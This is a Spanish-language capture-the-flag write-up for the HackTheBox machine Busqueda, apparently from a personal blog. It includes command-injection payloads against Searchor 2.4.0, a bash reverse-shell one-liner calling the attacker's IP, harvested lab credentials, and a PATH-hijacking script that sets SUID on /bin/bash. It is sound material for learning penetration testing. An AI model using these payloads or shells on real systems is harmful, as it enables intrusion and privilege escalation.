---
title: "Busqueda"
date: 2025-05-29 16:41:26 +0200
categories: writeups HackTheBox
tags: rce commandinjection máquina linux gitea infoleak pathhijacking portforwarding sudoers
description: Writeup de la máquina Busqueda de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Busqueda** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, en ella aprenderemos como ejecutar comandos remotamente gracias a la **Command Injection** presente la librería **Searchor**. Tras ganar acceso a la máquina víctima conseguiremos leer las credenciales del usuario actual para listar el permiso de **Sudoers** con el cual a su vez conseguiremos leer la credencial para el usuario **administrator** de **Gitea**. Una vez estamos en el **Gitea** como el usuario **administrator** conseguiremos leer el contenido del fichero sobre el cual tenemos permiso de **Sudoers** y nos daremos cuenta que el binario **full-checkup.sh** se está ejecutando de manera relativa por lo que abusaremos de un **Path Hijacking** para ejecutar el comando que queremos.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118201643.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.208`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.208 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118201800.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.208 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es que existe el subdominio **searcher.htb**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118201817.png>)
___
### Puerto 80 - HTTP (Apache)

Realizaremos **Virtual Hosting** añadiendo la siguiente línea `10.10.11.208    searcher.htb` al `/etc/hosts` y al acceder a dicho subdominio veremos la siguiente página.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118201904.png>)

Probaremos el funcionamiento de la página web rellenando el formulario tal que así.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118202138.png>)

Si no marcamos la casilla **Auto redirect** nos pondrá el link a la que página que nos hubiera redirigido.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118202122.png>)

___
## Explotación
### Command Injection vía Searchor 2.4.0

Tras mirar diferentes formas de explotación recurriremos a mirar exploits para la herramienta que se esta usando por detrás, es decir **Searchor 2.4.0**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118202204.png>)

Tras navegar por internet nos encontraremos con unos exploits que nos permiten ejecutar comandos remotamente a través de una **Command Injection** basada en los siguientes comandos.

```python
',exec("import+os;os.system('ping+-c+1+10.10.16.3')"))#
```

```python
',__import__('os').system('ping+-c+1+10.10.16.3'))#
```

A continuación ejecutando cualquiera de los anteriores payload conseguiremos tener ejecución remota de comandos (**RCE**) y además, somos capaces de ver el output del comando.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118203904.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nvlp 443`) y nos montaremos un servidor con python (`python3 -m http.server`) donde tendremos un archivo con el típico one liner de bash (`bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"`) para posteriormente enviar una **Reverse Shell** a través del siguiente payload.

Tal y como vemos a continuación conseguimos acceso a la máquina víctima.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118204059.png>)
___
## Escalada de privilegios
### Enumeración local

Tras navegar por los directorios de la página web (**/var/www/app**) nos encontraremos con un repositorio de github el cual tiene un archivo de configuración (`/var/www/app/.git/config`) con las siguientes credenciales.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118204212.png>)

Miraremos los procesos que están a la escucha y nos llamará la atención los dos servicios montados localmente, el del puerto **3000** y el **5000**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118204248.png>)

Tras mirar el fichero de configuración de apache (`/etc/apache2/sites-available/000-default.conf`) entenderemos mejor lo que está pasando, en definitiva el sitio web que vemos abierto externamente (`searcher.htb`) es el puerto **5000** de la máquina víctima ya que se está por un **Proxy**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118205319.png>)

Para poder acceder al puerto **3000** de la máquina victima hemos de realizar **Port Forwarding**, para ello usaremos **ssh** ya que es más cómodo que usar **chisel**.

En definitiva hemos de ejecutar los siguientes comandos para aplicar el **Local Port Forwarding**.

```bash
mkdir /home/svc/.ssh
cd /home/svc/.ssh
ssh-keygen
cat /home/svc/.ssh/id_rsa.pub > /home/svc/.ssh/authorized_keys
cat /home/svc/.ssh/id_rsa
```

Gracias a la instrucción nos conectaremos a la máquina victima usando la clave privada y a su vez realizaremos **Local Port Forwarding** donde estaremos convirtiendo nuestro puerto **80** en el puerto **3000** de la máquina víctima donde está alojado el **Gitea**.

```bash
ssh -i id_rsa svc@10.10.11.208 -L 80:127.0.0.1:3000
```

Al acceder a nuestro puerto **80** (puerto **3000** de la máquina víctima) veremos como nos saltará el siguiente warning. 

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118205649.png>)

Para solucionar el siguiente error hemos de añadir la siguiente línea `127.0.0.1     gitea.searcher.htb` al `/etc/hosts`.

Una vez solucionado nos logearemos como **cody** con las credenciales encontradas pero no podemos hacer nada interesante en el **Gitea**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225030.png>)
### Sudoers vía system-checkup.py

Probaremos la misma contraseña para listar los permisos **Sudoers** del usuario **svc** y observaremos que podemos ejecutar un script de python como **root**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225051.png>)

El script de python cuenta con el siguiente panel de ayuda con el cual podemos realizar diferentes acciones sobre contendores de docker.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225109.png>)

Listaremos los contenedores que hay en ejecución gracias al siguiente comando y nos llamará la atención el contenedor donde está alojado **mysql**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225129.png>)

Gracias al siguiente comando podemos listar toda la información del contendor de **mysql** en formato **json**.

```bash
sudo -u root python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
```

Entre toda la información que nos reporta nos llamará la atención unas variables de entorno donde están almacenadas 2 contraseñas.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225351.png>)

Tras probar diferentes combinaciones conseguiremos registrarnos en el **Gitea** con las siguientes credenciales **administrator:yuiu1hoiu4i5ho1uh** y nos llamará la atención el repositorio **scripts**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225618.png>)

Dicho repositorio podemos encontrarlo localmente en la ruta **/opt/scripts**.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225633.png>)

Tras revisar el código de los scripts a través del **Gitea** ya que localmente no podemos, nos percataremos que en el script **system-checkup.py** se está llamando a **full-checkup.sh** de manera relativa.

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225646.png>)

Nos aprovecharemos de que se está llamando relativamente al script **full-checkup.sh** para aplicar un **PATH Hijacking**, en primer lguar nos crearemos el script **/tmp/full-checkup.sh** con el siguiente contenido.

```bash
#!/bin/bash

chmod +s /bin/bash
```

Le daremos permisos de ejecución y ubicados en **/tmp** ejecutaremos la siguiente instrucción.

```bash
sudo -u root python3 /opt/scripts/system-checkup.py full-checkup
```

Observamos que la **/bin/bash** obtiene permisos **SUID** por lo que ya nos habremos convertido en el usuario **root** de manera efectiva (**efective user id**).

![](<../assets/images/posts/2025-05-29-busqueda/Pasted image 20250118225854.png>)